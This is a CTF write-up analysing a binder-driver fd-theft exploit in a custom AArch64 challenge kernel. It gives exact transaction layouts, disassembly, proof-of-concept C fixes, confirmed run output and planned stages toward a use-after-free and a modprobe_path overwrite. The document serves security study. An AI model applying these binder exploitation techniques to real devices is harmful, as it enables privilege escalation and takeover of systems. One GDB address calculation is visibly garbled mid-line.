# sekai-mte CTF — Kernel Binder fd Theft Analysis

## Overview

The challenge uses a custom AArch64 Linux kernel with a modified binder driver.
The goal is to steal a privileged fd from the `client` process by exploiting
frozen binder transaction cleanup.

---

## 1. Client fd Layout (binary: /bin/client, AArch64 statically linked)

```
fd0, fd1, fd2  stdin / stdout / stderr
close_range(3, 0x3ff)          @ 0x10123bc  -- closes ALL fds >= 3
fd3  = open("/dev/binder")     @ 0x1012410
fd4  = memfd_create("mte-client-shared", MFD_CLOEXEC|MFD_ALLOW_SEALING)  @ 0x101243c
fd5  = socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC) + bind + listen         @ 0x1012564
fd6, fd7   = pipe2(O_CLOEXEC|O_NONBLOCK)  @ 0x1012578
fd8, fd9   = pipe2(O_CLOEXEC)             @ 0x101258c
fd10, fd11 = pipe2(O_CLOEXEC)             @ 0x101259c
(clone worker thread)          @ 0x10125c8
close(fd10); close(fd11)       @ 0x1012640  -- fd10, fd11 freed

Then in function 0x10129ac:
  accept4(fd5, ...) -> fd10    (new connection from solver)
  close(fd5)                   -> fd5 FREED
  unlink('/tmp/mte-client.sock')
  dup2(fd10, fd5)              -> conn_fd is now at slot fd5

CLIENT'S fd5 = conn_fd (accepted unix socket to solver)
```

**Key**: after the `dup2(fd10, fd5)`, the client's fd5 is the unix socket
connection to the solver (the control channel, `ctl_fd` in poc).

---

## 2. Stale fd Trick — Mechanism

> **⚠️ OLDER ANALYSIS (Sections 2–7)**: These sections describe an earlier (partially wrong)
> understanding based on Ghidra disassembly of the frozen handler at 0x265c18. The mechanism
> described here (GROOM → COMMIT → direct frozen-handler buffer release) was **superseded** by
> the kernel C source analysis in Section 10 and confirmed correct on 2026-08-11.
> The correct mechanism: SETUP transactions prime two free slots with stale server fds;
> client's TX3 (TF_UPDATE_TXN) supersedes TX2 via `binder_proc_transaction`, releasing TX2's
> buffer which carries the stale fd=5 → `binder_deferred_fd_close(5)` in client context.
> See **Section 10.4** for the confirmed description and **Section 14** for the run output.

### Goal
Make client's `close_fd(5)` run so that when solver sends `SCM_RIGHTS`
(16 fds), the first fd installs at slot 5 (= `udp_client`).

### Trigger path (kernel binder)

```
solver --BC_TRANSACTION_SG--> server (GROOM, TF_ONE_WAY, has PTR+FDA)
  [transaction queued in server's todo list]

solver --BINDER_FREEZE(server)--> server is frozen

client --BC_TRANSACTION(COMMIT)--> server (frozen)
  kernel calls binder_transaction()
    target is frozen → calls function 0x265c18
      w26 = 1 (client has a pending txn flag set)
      0x265d2c: tbz w26, #0, #0x265dd8  -- NOT taken (w26==1)
      0x265d48: bl #0x2667d8             -- find pending txn in server's todo
      x22 = GROOM transaction (non-NULL)
      0x265dc0: b #0x265e64              -- bypasses x22=xzr at 0x265e60 !
    (clear frozen flag)
    0x265ebc: cbz x22, ...              -- x22 non-NULL, DON'T skip
    0x265ec0: ldr x20, [x22, #0x58]    -- GROOM's binder_buffer
    0x265ed0: mov w4, wzr               -- w4=0 → close_fd WILL run
    0x265eec: bl #0x264714             -- binder_transaction_buffer_release
```

**Critical**: `binder_transaction_buffer_release` runs in **CLIENT's context**
(client is the current task when it calls COMMIT).
`close_fd()` inside it calls `mrs sp_el0` → always acts on the CURRENT task.

### Inside binder_transaction_buffer_release (0x264714)

The function iterates the GROOM transaction's offsets array.
For each offset entry it reads the binder object type:

- `BINDER_TYPE_PTR (0x70742a85)` → no fd to close, skip
- `BINDER_TYPE_FDA (0x66646185)` → **fd close path** at 0x264928:
  1. Check `w4==0` (frozen path, not error path) → proceed
  2. Read `num_fds` from FDA struct (byte offset 8 in this kernel's format)
  3. Read `parent` from FDA struct (byte offset 16) → index into offsets array
  4. Call `find_ptr_object(parent_idx)` → reads `offsets[parent_idx]` → loads PTR
  5. Read `parent_offset` from FDA struct (byte offset 24)
  6. Check: `PTR->length - parent_offset >= num_fds * 4`
  7. For each fd: read 4 bytes from `PTR->buffer + parent_offset + i*4`
  8. Call `close_fd(fd_value)` in client's context!

For our GROOM: PTR->buffer = &target_val (= 5), so `close_fd(5)` fires.
Client's fd5 (conn_fd) is freed. Next SCM_RIGHTS fds install starting at fd5.

---

## 3. FDA Struct Layout (THIS KERNEL — different from standard Linux!)

Standard Linux `binder_fd_array_object`:
```c
// Standard: parent, parent_offset, num_fds
{ type, pad, parent(8), parent_offset(8), num_fds(8) }
```

**This CTF kernel** (confirmed by frame analysis at 0x264960, 0x26493c, 0x264980):
```c
// CTF kernel: num_fds BEFORE parent/parent_offset
struct binder_fd_array_object_ctf {
    uint32_t type;           // 0x66646185 = BINDER_TYPE_FDA
    uint32_t pad;            // 0
    uint64_t num_fds;        // byte 8:  number of fds to close
    uint64_t parent;         // byte 16: INDEX into offsets array of parent PTR
    uint64_t parent_offset;  // byte 24: byte offset in PTR's buffer where fds start
};  // 32 bytes total
```

Evidence:
- `ldur x2, [x29, #-0x20]` at 0x264960 = num_fds → used for `lsl x8, x2, #2`
- `ldur x3, [x29, #-0x18]` at 0x26493c = parent → passed to find_ptr_object as parent_idx
- `ldur x8, [x29, #-0x10]` at 0x264980 = parent_offset → used for bounds check

Function 0x264b30 copies raw bytes from binder buffer into frame at [x29-0x28],
so frame offset reflects on-the-wire byte offset:
- `[x29-0x28]` = byte 0  (type)
- `[x29-0x24]` = byte 4  (pad)
- `[x29-0x20]` = byte 8  (num_fds)
- `[x29-0x18]` = byte 16 (parent)
- `[x29-0x10]` = byte 24 (parent_offset)

---

## 4. SETUP Transaction Layout (confirmed correct — 2026-08-11)

> **Note**: This section was previously called "GROOM Transaction Layout" and had wrong
> values (`data_blob[88]`, `data_size=0x58`, `flags=0x41`, `PTR.buffer=&target_val`).
> All four fields are now corrected based on confirmed kernel buffer reuse mechanism
> (see Section 10.4). The stale-fd trick was **confirmed working** on 2026-08-11.

```
SETUP transaction (sent TWICE before binder_freeze, flags=0x01 TF_ONE_WAY only):

data_blob[80]:   ← 0x50 bytes (was 88/0x58 — WRONG)
  [0..7]   unused prefix (8 bytes)
  [8..47]  BINDER_TYPE_PTR (40 bytes):
             type=0x70742a85, flags=0
             buffer=&sg_buf   ← any valid 4-byte user-space addr (NOT &target_val)
             length=4
             parent=0, parent_offset=0
  [48..79] BINDER_TYPE_FDA (32 bytes):
             type=0x66646185, pad=0
             num_fds=1
             parent=0   (offsets[0]=8 → PTR)
             parent_offset=0

offsets_array[2] = {8, 48}   (PTR at data[8], FDA at data[48])
offsets_size = 16
data_size    = 0x50 = 80     ← CRITICAL: must match client's COMMIT data_size exactly
buffers_size = 8              (one SG buffer: PTR->length=4 → aligned to 8)
flags        = 0x01           ← TF_ONE_WAY only; NO TF_UPDATE_TXN (0x41 was WRONG)
```

Kernel buffer allocation size (binder_alloc_new_buf):
```
ALIGN(data_size, 8) + ALIGN(offsets_size, 8) + ALIGN(buffers_size, 8)
= ALIGN(0x50, 8) + ALIGN(0x10, 8) + ALIGN(0x08, 8)
= 0x50 + 0x10 + 0x08 = 0x68 bytes
```
This exactly matches the client's COMMIT transaction, enabling buffer slot reuse.

sg_buf_offset = ALIGN(data_size,8) + ALIGN(offsets_size,8) = 0x50 + 0x10 = 0x60
→ `kernel_buffer[0x60]` is where `binder_apply_fd_fixups` writes the server's allocated fd.

What the kernel does with PTR.buffer content:
1. During SETUP send: `binder_translate_fd_array` reads fd value from kernel_buffer[0x60]
   (copied from our sg_buf[4] = 0), calls `task_get_file(exploit_task, 0)` → captures file*
2. On delivery to server: `binder_apply_fd_fixups` calls `receive_fd(file*, 0)` in server
   context → allocates new fd (e.g. 4 or 5) in server's fdtable → **writes that fd number
   BACK to kernel_buffer[0x60]**
3. After server BC_FREE_BUFFER: buffer is freed but NOT zeroed → stale fd persists at [0x60]

The fd value in sg_buf (which file the server receives) is irrelevant to the stale trick.
Only the server's allocated fd NUMBER matters.

---

## 5. Frozen Handler Path Selection (0x265c18)

The frozen handler is called when a client sends BC_TRANSACTION to a frozen server.
It decides whether to **re-queue the COMMIT** (Path A) or **release the GROOM** (Path B).

**x21 = arg0 = COMMIT binder_transaction struct** (NOT binder_node).
The handler reads [COMMIT_txn+0x58] = COMMIT's binder_buffer, then derives
target_proc from [binder_buffer+0x38].

### Key branch: `tbz w8, #6, #0x265d90`  (@ 0x265d38)

```asm
; x21 = arg0 = COMMIT binder_transaction (the in-flight COMMIT txn struct)
00265d30: ldrb w8, [x21, #0x64]   ; w8 = [COMMIT_txn+0x64] = COMMIT's own flags (0x41)
00265d38: tbz  w8, #6, #0x265d90  ; if bit6 of COMMIT.flags NOT set → Path A (no close_fd!)
00265d3c: cbz  w25, #0x265d90     ; if [target_proc+0x71]==0 (not frozen) → Path A
00265d44: mov  x0, x21            ; x0 = COMMIT_txn
00265d48: bl   #0x2667d8          ; → find_pending_txn(COMMIT_txn, target_proc+0x70)
```

- **Path A** (bit6=0 in COMMIT.flags, or server not frozen): COMMIT re-queued. No close_fd.
- **Path B** (bit6=1 in COMMIT.flags, server frozen): find_pending_txn finds GROOM → buffer_release → close_fd(5).

### find_pending_txn (0x2667d8) — requirements

x0 = COMMIT_txn, x1 = target_proc+0x70 (async_todo list head).
x8 = GROOM work.entry = GROOM_txn+0x08 (from async_todo list iteration).

```asm
; ---- flags check ----
002667e4: mov  w9,  #0x41             ; MASK = bits 0 AND 6
002667f4: ldr  w10, [x8, #0x5c]      ; w10 = [GROOM_txn+0x08+0x5c] = [GROOM_txn+0x64] = GROOM.flags
002667f8: ldr  w11, [x0, #0x64]      ; w11 = [COMMIT_txn+0x64] = COMMIT.flags = 0x41
002667fc: and  w12, w10, w11
00266800: bics wzr,  w9, w12         ; fail if 0x41 & ~(GROOM.flags & COMMIT.flags) ≠ 0
00266838: cmp  w10, w11              ; fail if GROOM.flags ≠ COMMIT.flags (exact equality)

; ---- code check (0x266840–0x26684c) ----
00266840: ldr  w10, [x8, #0x58]      ; w10 = [GROOM_txn+0x08+0x58] = [GROOM_txn+0x60] = GROOM.code
00266844: ldr  w11, [x0, #0x60]      ; w11 = [COMMIT_txn+0x60] = COMMIT.code = 0x44464d43
00266848: cmp  w10, w11
0026684c: b.ne #0x266828             ; fail if GROOM.code ≠ COMMIT.code → returns NULL
```

**Both flags AND code must match:**
- GROOM.flags = 0x41 = COMMIT.flags ✓  (bics and cmp pass)
- GROOM.code  = 0x44464d43 = COMMIT.code ✓  (cmp passes)

**With GROOM.code = "GM1A" = 0x41314d47 (old broken value)**:
- 0x41314d47 ≠ 0x44464d43 → b.ne taken → find_pending_txn returns NULL → Path B fails

### GROOM flags and code requirements

| Field | Required value | Reason |
|-------|---------------|--------|
| flags | `0x41` | bit0=TF_ONE_WAY (async_todo); bit6=CTF flag for Path B and find_pending_txn |
| code  | `0x44464d43` | must match client COMMIT.code (fn_101423c: `mov w8,#0x4d43; movk w8,#0x4446,lsl#16`) |

**Fixes in fd_theft_poc.c** `groom_stale_fd()`:
- `.flags = 0x41` ✓ (already applied)
- `.code  = 0x44464d43` ✓ (replaces wrong `.code = tag` which gave 0x41314d47)

---

## 6. Client Binary — COMMIT Handler Notes

### Main thread COMMIT handler (0x1012dd0)
- Builds CWP1 (cmd_type=2), writes to worker pipe at `[sp+0x11cc]`
- On EPIPE (errno=11): sends error reply to fd5 but does **NOT** close fd5
- Falls through to 0x1012e8c and loops back
- **NO close(fd5) anywhere in this handler or any error path**
- Shutdown path at 0x10130c4: calls `exit(1)` immediately — never closes fds cleanly

### fn_1017174 = recvmsg()
- Syscall 0xd4 = 212 = sys_recvmsg
- Main cmd loop calls `recvmsg(fd5, msghdr, 0)` → **CAN receive SCM_RIGHTS**

### Worker d8 register (always 0 at clone time)
- Linux zeroes all FP/SIMD registers on exec
- Worker is cloned at 0x10125c8 **before** main cmd loop loads d8=1 from rodata
- Worker entry fn_1013630 saves d8=0 → d8-derived counter w22=0 forever
- Result: CONVERGENCE path flags = 0x01 always (not 0x41) from client side

---

## 7. Stage 6 Flow

```
[Stage 5]
groom_stale_fd(binder_fd, 5, "GM1A")  -- flags=0x41, queue GROOM in server's async_todo
groom_stale_fd(binder_fd, 5, "GM2A")  -- flags=0x41, second GROOM queued
usleep(100000)
binder_freeze(server_pid)             -- freeze server

[Stage 6]
write "COMMIT\nCOMMIT\nCOMMIT\n" to client's ctl_fd (fd5 = conn_fd)
sleep(1)
sendmsg(ctl_fd, SCM_RIGHTS(16 fds: fds[0]=udp_client, ...))
  -- kernel queues SCM_RIGHTS fds for delivery when client reads them

Client processes COMMIT:
  client calls BC_TRANSACTION(COMMIT) on frozen server
  → frozen handler 0x265c18:
      [binder_node+0x64] = 0x41 (bit6=1) → NOT taken tbz → Path B checks pass
      find_pending_txn finds GROOM in async_todo (flags match 0x41)
      → binder_transaction_buffer_release (w4=0, frozen path)
          → FDA handler: close_fd(5) in client's context!
  → client's fd5 (conn_fd) freed!
  → kernel delivers SCM_RIGHTS: fds install starting at slot 5:
       client fd5  = udp_client
       client fd6  = spair[1]
       client fd7  = replacement_fd
       client fd8..fd20 = /dev/null × 13

setsockopt(udp_peer, IP_OPTIONS, groom_bytes)
write(udp_peer, "GROOM\n", 6)
  → arrives at udp_client (now client's fd5)
  → client's recvmsg loop reads "GROOM\n" on fd5
  → unknown command → client replies via sendmsg(w22=5, ...)
  → w22=5 IS udp_client → reply goes to udp_peer (solver side)
  → solver sees reply → Stage 6 confirmed!
```

---

## 8. Next Steps

- [x] Confirm client COMMIT transaction layout: data_size=0x50, offsets={8,0x30}, code=0x44464d43
- [x] Stage 5+6: SETUP transactions + BINDER_FREEZE + three COMMITs + SCM_RIGHTS + UDP GROOM
- [x] Stage 6 verified working end-to-end (**2026-08-11**: "0 failed invalid" received, client fd=5 redirected)
- [ ] Stage 7: use udp_peer to drive client (via its new fd=5=udp_client) through full HELLO→COMMIT→CHALLENGE→SUBMIT flow
- [ ] Stage 8: deliver shellcode via EXEC command (auth requires uid=30000; needs mte_driver UAF to forge)
- [ ] Stage 9: mte_driver EXEC_AUTH (0x41084D12) + VERIFY_KEY (0x41084D14) + GLOBAL_ALLOC/FREE/CHECK_WRITE UAF
- [ ] Stage 10: racer_scc UAF race → arbitrary write → modprobe_path overwrite → flag

---

## 9. Key Kernel Addresses

| Address   | Description                                        |
|-----------|----------------------------------------------------|
| 0x265c18  | Frozen transaction handler (called from binder_transaction) |
| 0x265d2c  | `tbz w26, #0` — if TF_ONE_WAY not set → skip Path B entirely |
| 0x265d38  | `tbz w8, #6` — [COMMIT_txn+0x64] bit6 check; bit6=0 in COMMIT.flags → Path A (no close_fd) |
| 0x265d90  | Path A: re-queue COMMIT into server async_todo, return x22=NULL |
| 0x265d48  | Path B: `bl find_pending_txn` |
| 0x2667d8  | find_pending_txn: requires GROOM.flags==COMMIT.flags==0x41 AND GROOM.code==COMMIT.code==0x44464d43 |
| 0x265e64  | Convergence: process found pending txn             |
| 0x265eec  | `bl binder_transaction_buffer_release` (w4=0, frozen path) |
| 0x264714  | binder_transaction_buffer_release                  |
| 0x264928  | FDA handler in buffer_release                      |
| 0x264cec  | find_ptr_object                                    |
| 0x2649f4  | `close_fd(fd_value)` — the actual fd close           |
| 0x1290a4  | close_fd (kernel function)                         |
| 0x26a544  | binder_alloc_copy_from_buffer                      |
| 0x264b30  | Read binder object from buffer into stack frame    |

---

## 10. Kernel C Source Analysis — Confirmed Mechanisms

*Source: `linux-kernel/drivers/android/binder.c` and `binder_alloc.c` from the CTF kernel.*

### 10.1 TF_ONE_WAY queuing behavior (`binder_proc_transaction`)

The first TF_ONE_WAY to a binder node: `node->has_async_transaction == false`
→ sets `has_async_transaction = true`, `pending_async = false`
→ transaction goes to **`proc->todo`** (wakes server thread)

The second TF_ONE_WAY: `node->has_async_transaction == true`
→ `pending_async = true`
→ transaction goes to **`node->async_todo`** (no wakeup)

When a buffer for an async transaction is freed (`binder_free_buf`):
→ promotes the next item from `node->async_todo` to `proc->todo` and wakes server.

### 10.2 TF_UPDATE_TXN path

Only taken when **`pending_async == true` AND `proc->is_frozen`** AND
the incoming transaction has `TF_UPDATE_TXN (0x40)`.

```c
// binder_proc_transaction (simplified)
} else if (t->flags & TF_UPDATE_TXN && proc->is_frozen) {
    t_outdated = binder_find_outdated_transaction_ilocked(t, &node->async_todo);
    if (t_outdated) {
        struct binder_buffer *buffer = t_outdated->buffer;
        t_outdated->buffer = NULL;
        buffer->transaction = NULL;
        binder_release_entire_buffer(proc, NULL, buffer, false);
        binder_alloc_free_buf(&proc->alloc, buffer);
        kfree(t_outdated);   // NOTE: fd_fixups list LEAKS; only buffer is released
        binder_stats_deleted(BINDER_STAT_TRANSACTION);
    }
}
```

### 10.3 `binder_can_update_transaction` — pid check

```c
static bool binder_can_update_transaction(struct binder_transaction *t1,
                                          struct binder_transaction *t2) {
    if ((t1->flags & t2->flags & (TF_ONE_WAY | TF_UPDATE_TXN)) !=
        (TF_ONE_WAY | TF_UPDATE_TXN) || !t1->to_proc || !t2->to_proc)
        return false;
    if (t1->to_proc->tsk == t2->to_proc->tsk && t1->code == t2->code &&
        t1->flags == t2->flags && t1->buffer->pid == t2->buffer->pid &&
        t1->buffer->target_node->ptr == t2->buffer->target_node->ptr &&
        t1->buffer->target_node->cookie == t2->buffer->target_node->cookie)
        return true;
    return false;
}
```

**`buffer->pid = current->tgid`** is set in `binder_alloc.c:689` at buffer allocation time,
capturing the SENDER's tgid.

**Consequence for the exploit:**
- GROOM transactions: `buffer->pid = solver_tgid`
- COMMIT transactions: `buffer->pid = client_tgid`
- `solver_tgid ≠ client_tgid` → **GROOM can NEVER be replaced by COMMIT**
- COMMIT1 vs COMMIT2: same `client_tgid` → **they DO match** — this is the actual update path

### 10.4 Stale FD Buffer Reuse Mechanism (confirmed working 2026-08-11)

The mechanism relies on physical buffer memory reuse and the scatter-gather skip.
Key insight: the SETUP transactions prime two memory slots with stale fd values;
the client's three COMMITs then reuse those slots, with TX3 superseding TX2 and
triggering `binder_deferred_fd_close` in the CLIENT's context.

```
Stage 5 (SETUP phase — both sent before binder_freeze, NO sleep between them):

SETUP1 (flags=0x01, TF_ONE_WAY, data_size=0x50):
  → node->has_async_transaction=false → sets to true → goes to proc->todo → WAKES server
  → server reads SETUP1 from proc->todo
  → binder_apply_fd_fixups() runs in SERVER context:
      receive_fd(file*, 0) → allocates server fd=4 (server has fds 0,1,2,3 before SETUP1)
      writes fd=4 to kernel_buffer_A[0x60]
      fd_install(4, file)
  → server calls BC_FREE_BUFFER for SETUP1:
      binder_free_buf():
        promotes SETUP2 from node->async_todo to proc->todo (keeps has_async_transaction=true)
        binder_alloc_free_buf() → slot A returned to free pool (NOT zeroed)
        ★ stale fd=4 persists at kernel_buffer_A[0x60] ★

SETUP2 (flags=0x01, TF_ONE_WAY):
  → pending_async=true (SETUP1 still in async_todo before promotion) → async_todo
  → after SETUP1's BC_FREE_BUFFER: promoted to proc->todo → server wakes
  → binder_apply_fd_fixups(): receive_fd() → server fd=5 → writes to kernel_buffer_B[0x60]
  → BC_FREE_BUFFER: node->async_todo empty → has_async_transaction=false
      binder_alloc_free_buf() → slot B returned (NOT zeroed)
      ★ stale fd=5 persists at kernel_buffer_B[0x60] ★

binder_freeze(server)   ← both slots A and B now free with stale fds

Stage 6 (client sends 3 COMMITs via ctl_fd):

TX1 (COMMIT, flags=0x01, data_size=0x50):
  → has_async_transaction=false (reset after SETUP2 done) → sets to true → proc->todo
  → binder_alloc_new_buf(0x68) → gets slot A (first exact-fit in RB tree)
  → ★ stale fd=4 at TX1_buffer[0x60] (from SETUP1)
  → fd fixups: reads stale fd=4 from kernel buffer → task_get_file(client, 4) = udp_client
    (fixup stored but never applied — server is frozen)

TX2 (COMMIT, flags=0x41=TF_ONE_WAY|TF_UPDATE_TXN, data_size=0x50):
  → has_async_transaction=true (set by TX1) → async_todo
  → server is frozen, TF_UPDATE_TXN path: binder_find_outdated_transaction_ilocked(TX2, async_todo)
    → async_todo is EMPTY (TX1 went to proc->todo) → returns NULL → TX2 queued to async_todo
  → binder_alloc_new_buf(0x68) → gets slot B (next exact-fit after slot A was taken)
  → ★ stale fd=5 at TX2_buffer[0x60] (from SETUP2) ★
  → fd fixups: reads stale fd=5 → task_get_file(client, 5) = conn_fd file*
    (fixup stored, never applied)

TX3 (COMMIT, flags=0x41=TF_ONE_WAY|TF_UPDATE_TXN, data_size=0x50):
  → TF_UPDATE_TXN && is_frozen path:
  → binder_find_outdated_transaction_ilocked(TX3, async_todo):
      finds TX2: SAME client_tgid ✓, SAME code ✓, SAME flags ✓ → MATCH!
  → t_outdated = TX2
  → binder_release_entire_buffer(TX2_buffer, is_failure=false):
      iterates objects (using TX2's offsets_array), finds BINDER_TYPE_FDA at data[0x30]
      binder_alloc_copy_from_buffer() reads 4 bytes at sg_buf_offset=0x60 → stale fd=5
      binder_deferred_fd_close(5) called in CLIENT's ioctl context (client thread is current!)
      → file_close_fd(5) removes fd=5 from CLIENT's fdtable ★
  → kfree(TX2); TX2's fd_fixup list LEAKS (intentional — only buffer is released)
```

**Result**: client's fd=5 (conn_fd) is closed. The solver's `sendmsg(SCM_RIGHTS)` with
16 fds delivers `fds[0]=udp_client` into client's fd=5 (first free slot).

**Confirmed output (2026-08-11)**:
- `[DBG] recv 5 bytes: '4 ok\n'` — client responded to COMMIT via UDP (fd=5=udp_client) ✓
- `[DBG] recv 17 bytes: '0 failed invalid\n'` — GROOM\n received on client's new fd=5 ✓
- `[+] client groom reply = 0 failed invalid` — Stage 6 success ✓

### 10.5 Scatter-Gather Skip for FDA region

During `binder_transaction` scatter-gather copy for BINDER_TYPE_FDA:
- `binder_translate_fd_array()` calls `binder_add_fixup(pf_head, fda_offset, 0, num_fds*4)`
- The `skip_size = num_fds*4` argument causes `binder_sg_copy()` to **skip** writing
  to the fda_offset region in the target buffer
- Result: stale data at fda_offset is PRESERVED even after COMMIT1's scatter-gather copy

### 10.6 `binder_apply_fd_fixups` (called when server reads transaction)

```c
// binder_thread_read → binder_apply_fd_fixups for each fd_fixup:
list_for_each_entry_safe(fixup, tmp, fd_fixups, fixup_entry) {
    target_fd = get_unused_fd_flags(O_CLOEXEC);  // allocates fd in CURRENT (server) context
    binder_alloc_copy_to_buffer(&proc->alloc, buffer,
                                fixup->offset, &target_fd, sizeof(target_fd));
    fd_install(target_fd, fixup->file);
    fput(fixup->file);
    list_del(&fixup->fixup_entry);
    kfree(fixup);
}
```

The fd number allocated by the server (e.g., 5) is written into the binder buffer.
That buffer memory is later reused for COMMIT1, carrying the stale fd value.

### 10.7 Buffer reuse size matching

For COMMIT1 to reuse GROOM1's buffer, COMMIT1 must request the same allocation size.
`binder_alloc_new_buf` allocates `data_size + offsets_size + extra_buffers_size` rounded up.

**Currently unconfirmed**: the exact transaction layout the client sends as COMMIT
(data_size, offsets_size). The client binary has only ONE ioctl site (BINDER_VERSION);
it is unclear how "COMMIT" triggers a binder transaction — needs further binary analysis.

### 10.8 Object type behavior in `binder_transaction_buffer_release`

| Object type | On release (`is_failure=false`) | On release (`is_failure=true`) |
|-------------|--------------------------------|-------------------------------|
| `BINDER_TYPE_FD` | Nothing (comment: user-space closes it) | Nothing |
| `BINDER_TYPE_PTR` | Nothing | Nothing |
| `BINDER_TYPE_FDA` | Reads fd from buffer → `binder_deferred_fd_close(fd)` | **Skipped** (`is_failure` check) |

The `is_failure=false` (0) path is taken in the t_outdated cleanup inside `binder_proc_transaction`.

---

## 11. UDP GROOM Handshake — Stage 6 Missing Step

The "client did not consume cmsg groom" error in the real solver comes from a UDP
handshake that `fd_theft_poc.c` Stage 6 is **entirely missing**.

### What the real solver does after SCM_RIGHTS sendmsg:

```c
// 1. Set IP_OPTIONS on udp_peer with uid=30000, gid=30000 (for authentication)
setsockopt(udp_peer, IPPROTO_IP, IP_OPTIONS, &opt_buf, 0x18);

// 2. Send "GROOM\n" via udp_peer (NOT via ctl_fd / control socket)
write(udp_peer, "GROOM\n", 6);
//   ↑ This arrives at udp_client, which was just installed as client's fd=5

// 3. Wait up to 16 polls for client to reply via recvfrom(udp_peer, ...)
for (int i = 16; i > 0; i--) {
    poll(udp_peer, POLLIN, timeout);
    ssize_t n = recvfrom(udp_peer, buf, 0xff, 0);
    if (response_matches) break;
    if (i == 1) {
        binder_freeze(server, 0);  // unfreeze server
        fatal("client did not consume cmsg groom");
    }
}
```

### Why the client responds:

After SCM_RIGHTS delivers `udp_client` to client's fd=5, the client's main cmd loop
calls `recvmsg(fd5, ...)`. The "GROOM\n" UDP packet arrives on fd5 = udp_client.
The client sees an unknown command → sends a reply via `sendmsg(w22=5, ...)`.
Since w22=5 is the udp_client socket, the reply goes back to udp_peer (solver).
Solver sees the reply → Stage 6 confirmed (fd=5 successfully redirected).

### Fix needed in fd_theft_poc.c Stage 6:

After the `sendmsg(ctl_fd, SCM_RIGHTS...)` call, add:
```c
// Authenticate and probe client's new fd=5
struct ip_opts { /* uid/gid option bytes for IP_OPTIONS */ } opt;
setsockopt(udp_peer_fd, IPPROTO_IP, IP_OPTIONS, &opt, sizeof(opt));

write(udp_peer_fd, "GROOM\n", 6);

// Wait for client reply (up to 16 attempts)
for (int attempt = 16; attempt > 0; attempt--) {
    struct pollfd pfd = { .fd = udp_peer_fd, .events = POLLIN };
    if (poll(&pfd, 1, 500) > 0) {
        char rbuf[256];
        ssize_t n = recvfrom(udp_peer_fd, rbuf, sizeof(rbuf), 0, NULL, NULL);
        if (n > 0) { /* success */ break; }
    }
    if (attempt == 1) { fprintf(stderr, "client did not reply\n"); exit(1); }
}
```

---

## 12. GDB Usage in QEMU TCG (AArch64 kernel debugging)

### Problem: software breakpoints don't work

QEMU TCG translates instructions to host code blocks. Software breakpoints (`b *addr`)
insert a trap instruction into the translated block — this does NOT work for kernel pages
because QEMU's TCG cache doesn't handle them correctly for kernel code.

### Solution: hardware breakpoints

```gdb
# Use hbreak (hardware breakpoint) instead of b for kernel addresses
hbreak *0x<physical_address>

# Maximum 4 hardware breakpoints on AArch64 (hardware limit)
```

### Address translation

The CTF kernel is loaded at physical base `0x40200000`.
Ghidra shows virtual addresses with kernel image base assumed at `0x00000000` (or similar).

```
physical_address = ghidra_virtual_address + 0x40200000
```

Example:
- Ghidra: `0x265c18` (frozen handler)
- QEMU GDB: `hbreak *0x2665c18`  ← `0x265c18 + 0x40200000 = 0x4065c18`

Wait: `0x265c18 + 0x40200000 = 0x40465c18`

```
# General formula:
(gdb) hbreak *$(python3 -c "print(hex(0xGHIDRA_ADDR + 0x40200000))")
```

### Useful GDB commands for this kernel

```gdb
# Connect to QEMU GDB server (usually :1234)
target remote :1234

# Hardware breakpoints for kernel
hbreak *0x40465c18     # frozen handler
hbreak *0x4046a544     # binder_alloc_copy_from_buffer
hbreak *0x40264714     # binder_transaction_buffer_release

# Continue execution
c

# Print binder_transaction fields (assuming x0 = transaction ptr)
x/20gx $x0

# Watchpoint on a specific kernel address (can watch for fd close)
watch *(int*)0x<addr>

# Read current->tgid to verify context
p ((struct task_struct *)$x18)->tgid
```

### Checking execution context in GDB

To verify you're in client vs server vs solver context when a breakpoint hits:

```gdb
# current task_struct is at x18 (shadow call stack register on AArch64 Linux)
p ((struct task_struct *)$x18)->pid
p ((struct task_struct *)$x18)->tgid
p ((struct task_struct *)$x18)->comm
```

---

## 13. Open Questions / Pending Investigation

~~1. Client's COMMIT transaction data_size~~ — **RESOLVED**: data_size=0x50 confirmed from
   client binary at file offset 0x6d0. offsets = {8, 0x30}. Total kernel buf = 0x68.

~~2. Server fd table grooming~~ — **RESOLVED**: server has fds 0-3 (stdin/stdout/stderr/binder)
   before SETUP1. SETUP1→fd=4, SETUP2→fd=5. stale fd=5 closes client's conn_fd. ✓

~~3. COMMIT transaction data_size match~~ — **RESOLVED**: both SETUP and COMMIT use data_size=0x50,
   producing 0x68-byte kernel buffers. Buffer reuse confirmed by successful run.

~~4. Reconcile Ghidra vs kernel source~~ — **RESOLVED**: the buffer-reuse mechanism (Section 10.4)
   is confirmed correct. The earlier frozen-handler analysis (Sections 2-7) was partially
   wrong. The actual path goes through binder_proc_transaction's TF_UPDATE_TXN branch,
   not through the frozen handler's direct GROOM→buffer_release path.

**Remaining open questions:**

1. **Stage 7 protocol**: How to drive client through HELLO→COMMIT→CHALLENGE→SUBMIT via
   UDP (now that client fd=5 = udp_client). The client's socket handler reads lines from
   fd=5 and parses commands — sending "HELLO\n" via udp_peer should work but needs
   testing for framing (UDP vs stream).

2. **EXEC auth bypass**: uid check requires 30000, solver has uid=1000. Needs mte_driver
   UAF write to forge client's state+0x14 (hardcoded 30000) to 1000, OR use a
   different exploit path.

3. **mte_driver fd delivery to client**: FUN_01012c20 sends BINDER_TYPE_FD to client.
   Confirm trigger condition (state+0x24==0 after CLOSE vs after SUBMIT).

---

## 14. Confirmed Success: Stage 5+6 (2026-08-11)

### What was fixed in fd_theft_poc.c

| Field | Old (wrong) | New (correct) | Reason |
|-------|-------------|---------------|--------|
| `data_blob` size | `[88]` | `[80]` | Must match client data_size=0x50 |
| `data_size` | `0x58` | `0x50` | Client binary file offset 0x6d0 confirms 0x50 |
| `flags` | `0x41` | `0x01` | TF_UPDATE_TXN in SETUP would cause SETUP2 to supersede SETUP1 |
| `PTR.buffer` | `&target_val` (stale fd wrong source) | `&sg_buf` (any 4B) | Stale fd comes from server's allocated fd written by binder_apply_fd_fixups |
| Function name | `groom_stale_fd(fd, target_fd, tag)` | `send_setup(fd, tag)` | Removed unused target_fd param |

### Run output annotated

```
[+] setup sent, tag GM1A         ← SETUP1 → server fd=4 at slot A[0x60]
[+] setup sent, tag GM2A         ← SETUP2 → server fd=5 at slot B[0x60]
binder: 101 RLIMIT_NICE not set  ← server processed SETUP1 (binder_apply_fd_fixups ran)
binder: 101 RLIMIT_NICE not set  ← server processed SETUP2
[...stage 6...]
